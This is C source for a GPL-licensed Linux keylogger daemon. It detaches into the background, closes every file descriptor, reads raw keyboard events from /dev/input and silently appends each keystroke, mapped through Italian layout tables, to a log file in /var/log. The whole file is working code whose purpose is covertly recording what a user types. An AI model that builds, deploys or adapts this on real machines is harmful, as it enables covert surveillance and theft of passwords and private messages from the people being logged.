/**************************************************************************
 * Name:        Keylogger-Daemon-Linux                                    *
 * Description:	is a keylogger daemon for Linux-based OS that             *
 *              silently listens in the background for pressed            *
 *              keyboard buttons.                                         *
 * Author:      Emiliano Silvestri                                        *
 *                                                                        *
 * Copyright (C) 2021  Emiliano Silvestri                                 *
 *                                                                        *
 * This program is free software: you can redistribute it and/or modify   *
 * it under the terms of the GNU General Public License as published by   *
 * the Free Software Foundation, either version 3 of the License, or      *
 * (at your option) any later version.                                    *
 *                                                                        *
 * This program is distributed in the hope that it will be useful,        *
 * but WITHOUT ANY WARRANTY; without even the implied warranty of         *
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the          *
 * GNU General Public License for more details.                           *
 *                                                                        *
 * You should have received a copy of the GNU General Public License      *
 * along with this program.  If not, see <https://www.gnu.org/licenses/>. *
 **************************************************************************/

#include <unistd.h>
#include <stdlib.h>
#include <signal.h>
#include <stdio.h>
#include <string.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <linux/input.h>

#include "keylogger.h"

#ifndef BUFFER_SIZE
#define BUFFER_SIZE		1024
#endif

#if BUFFER_SIZE < 32
#define BUFFER_SIZE		32
#endif

static const char *kb_input_path = "/dev/input/event" EVENT_NUMBER;
static const char *kb_log_path = "keyboard.log";

static int log_fd;
static ssize_t off = 0;
static char *buffer = NULL;

static inline __attribute__((always_inline))
int buffer_write(const char *src, size_t len)
{
	if ((off + len) >= BUFFER_SIZE)
	{
		if (write(log_fd, (const void *) buffer, off) == -1)
			return -1;
		off = 0;
	}
	memcpy((void *) &buffer[off], (const void *) src, len);
	off += len;
	return 0;
}

static int key_logger(void)
{
	int evt_fd;
	size_t len;
	struct input_event in_evt;

	unsigned int holding_shift = 0;
	unsigned int holding_r_alt = 0;
	unsigned int pressed_capslock = 0;

	if ((buffer = (char *) malloc(BUFFER_SIZE)) == NULL)
		return -1;

	if ((evt_fd = open(kb_input_path, O_RDONLY)) == -1)
	{
		free((void *) buffer);
		return -1;
	}

	if ((log_fd = open(kb_log_path, O_WRONLY|O_APPEND|O_CREAT, S_IRUSR|S_IWUSR)) == -1)
	{
		close(evt_fd);
		free((void *) buffer);
		return -1;
	}

	while (1)
	{
		if (read(evt_fd, (void *) &in_evt, sizeof(struct input_event)) == -1)
			break;

		if (in_evt.type == EV_KEY)
		{
			if (in_evt.value == 1)
			{
				if (in_evt.code == KEY_LEFTSHIFT | in_evt.code == KEY_RIGHTSHIFT)
					holding_shift = 1;
				else if (in_evt.code == KEY_RIGHTALT)
					holding_r_alt = 1;
				else if (in_evt.code == KEY_CAPSLOCK)
					pressed_capslock ^= 1;
				else if (holding_shift && holding_r_alt)
				{
					if ((len = strlen(ALT_IT_key_binding[in_evt.code])) > 0)
						if (buffer_write(ALT_IT_key_binding[in_evt.code], len) == -1)
							break;
				}
				else if (holding_shift)
				{
					if (pressed_capslock &&
						((in_evt.code >= KEY_Q && in_evt.code <= KEY_P) ||
							(in_evt.code >= KEY_A && in_evt.code <= KEY_L) ||
								(in_evt.code >= KEY_Z && in_evt.code <= KEY_M)))
					{
						if ((len = strlen(it_key_binding[in_evt.code])) > 0)
							if (buffer_write(it_key_binding[in_evt.code], len) == -1)
								break;
					}
					else if ((len = strlen(IT_key_binding[in_evt.code])) > 0)
						if (buffer_write(IT_key_binding[in_evt.code], len) == -1)
							break;
				}
				else if (holding_r_alt)
				{
					if ((len = strlen(ALT_it_key_binding[in_evt.code])) > 0)
						if (buffer_write(ALT_it_key_binding[in_evt.code], len) == -1)
							break;
				}
				else
				{
					if (pressed_capslock &&
						((in_evt.code >= KEY_Q && in_evt.code <= KEY_P) ||
							(in_evt.code >= KEY_A && in_evt.code <= KEY_L) ||
								(in_evt.code >= KEY_Z && in_evt.code <= KEY_M)))
					{
						if ((len = strlen(IT_key_binding[in_evt.code])) > 0)
							if (buffer_write(IT_key_binding[in_evt.code], len) == -1)
								break;
					}
					else if ((len = strlen(it_key_binding[in_evt.code])) > 0)
						if (buffer_write(it_key_binding[in_evt.code], len) == -1)
							break;
				}
			}
			else if (in_evt.value == 0)
			{
				if (in_evt.code == KEY_LEFTSHIFT | in_evt.code == KEY_RIGHTSHIFT)
					holding_shift = 0;
				else if (in_evt.code == KEY_RIGHTALT)
					holding_r_alt = 0;
			}
		}
	}

	close(log_fd);
	close(evt_fd);
	free((void *) buffer);

	return -1;
}

void sigterm_handler(int sig)
{
	int out = 0;

	if (write(log_fd, (const void *) buffer, off) == -1)
		out = -1;

	close(log_fd);
	free((void *) buffer);

	exit(out);
}

int main(void)
{
	int fd;
	pid_t pid;
	pid_t sid;
	mode_t old_mask;

	sigset_t set;
	sigset_t old_set;
	struct sigaction act;
	struct sigaction old_act;

	if ((pid = fork()) < 0)
		return -1;
	else if (pid > 0)
		return 0;

	if ((sid = setsid()) < 0)
		return -1;

	memset((void *) &act, 0, sizeof(struct sigaction));

	if (sigfillset(&set)) return -1;
	if (sigprocmask(SIG_BLOCK, &set, &old_set)) return -1;

	act.sa_mask = set;
	act.sa_handler = sigterm_handler;
	if (sigaction(SIGTERM, &act, &old_act)) return -1;

	if (sigemptyset(&set)) return -1;
	if (sigaddset(&set, SIGTERM)) return -1;
	if (sigprocmask(SIG_UNBLOCK, &set, NULL)) return -1;

	if ((pid = fork()) < 0)
		return -1;
	else if (pid > 0)
		return 0;

	old_mask = umask(0);

	if (chdir("/var/log") < 0)
		return -1;

	for (fd=sysconf(_SC_OPEN_MAX); fd>=0; fd--)
		close(fd);

	return key_logger();
}